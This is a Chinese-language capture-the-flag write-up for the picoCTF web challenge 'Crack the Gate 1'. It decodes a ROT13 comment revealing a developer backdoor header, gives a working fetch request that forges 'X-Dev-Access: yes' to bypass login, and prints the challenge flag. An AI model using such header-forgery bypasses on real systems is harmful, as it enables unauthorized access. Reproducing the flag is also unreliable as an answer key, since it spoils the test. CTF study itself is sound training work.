# Crack the Gate 1 - Writeup

## 题目信息

* **题目名称**：Crack the Gate 1
* **题目类型**：Web Exploitation
* **难度**：Easy
* **作者**：Prince Niyonshuti N.
* **描述**：
  我们正在进行一项调查，目标人物在一个受限的网站中隐藏了敏感数据。我们已经发现了他用于登录的邮箱地址：`ctf-player@picoctf.org`。不幸的是，我们不知道密码，常见的猜测方法也不起作用。然而，似乎开发者留下了一个秘密入口。你能找到它吗？

---

## 解题思路

这道题考察了对 **Web CTF 中的源码审计和HTTP头伪造**的能力。

### 1. 查看源码

题目给了一个关键提示，**开发者可能在源码里留下了秘密入口**。首先，右键点击网页，选择 **查看页面源代码**，我们发现了一个重要的 **ROT13 编码的注释**，该注释包含了提示信息：

```html
<!-- ABGR: Wnpx - grzcbene olncff: hfr urnqre "K-Qri-Npprff: lrf" -->
```

解码后变为：

```text
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

这意味着 **开发者留了一个绕过登录的临时后门**，我们只需要在请求头中添加 `X-Dev-Access: yes` 即可绕过登录验证。

### 2. 发送伪造的请求

通过 **浏览器控制台** 或 **开发者工具**，我们可以通过以下代码发送请求：

```javascript
fetch("http://amiable-citadel.picoctf.net:51720/login", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "X-Dev-Access": "yes"
  },
  body: JSON.stringify({
    email: "ctf-player@picoctf.org",
    password: "123456"
  })
})
.then(r => r.json())
.then(console.log)
```

这样，`X-Dev-Access: yes` 会让请求通过开发者的绕过机制，直接获得访问权限。

### 3. 获取 Flag

服务器返回成功后，我们将得到一个包含 Flag 的响应：

```json
{
  "success": true,
  "flag": "picoCTF{brut4_forc4_b3a957eb}"
}
```

最终的 Flag 为：

```text
picoCTF{brut4_forc4_b3a957eb}
```

---

## 总结

这道题的关键点：

1. **源码审计**：通过查看页面源码，发现了隐藏的调试信息。
2. **ROT13 解码**：解码注释中的 ROT13 提示。
3. **HTTP 头伪造**：通过伪造请求头 `X-Dev-Access: yes` 绕过登录验证。
4. **成功登录后获取 Flag**。

### 常见的 Web CTF 攻击方法：

* **查看源码**：CTF 中经常通过查看源码泄露敏感信息。
* **编码与加密**：常见的编码手法如 Base64 和 ROT13。
* **HTTP 头伪造**：通过修改 HTTP 请求头，绕过安全验证。
